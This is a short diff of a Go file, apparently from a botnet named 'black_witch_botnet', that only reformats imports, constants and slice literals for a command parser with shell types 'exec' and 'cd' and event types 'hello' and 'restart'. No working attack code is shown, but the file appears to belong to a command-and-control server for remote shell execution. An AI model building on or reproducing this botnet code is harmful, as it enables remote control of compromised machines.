@@ -1,8 +1,8 @@
 package server
 
 import (
-	"errors"
 	"black_witch_botnet/relations"
+	"errors"
 	"strings"
 )
 
@@ -12,18 +12,18 @@ const (
 )
 
 const (
-	shellTypeExec = "exec"
+	shellTypeExec      = "exec"
 	shellTypeChangeDir = "cd"
 )
 
 const (
-	eventTypeHello = "hello"
+	eventTypeHello   = "hello"
 	eventTypeRestart = "restart"
 )
 
-var domains = []string{ domainShell, domainEvent }
-var shellTypes = []string{ shellTypeExec, shellTypeChangeDir }
-var eventTypes = []string{ eventTypeHello, eventTypeRestart }
+var domains = []string{domainShell, domainEvent}
+var shellTypes = []string{shellTypeExec, shellTypeChangeDir}
+var eventTypes = []string{eventTypeHello, eventTypeRestart}
 
 type Parser struct {
 	Text string
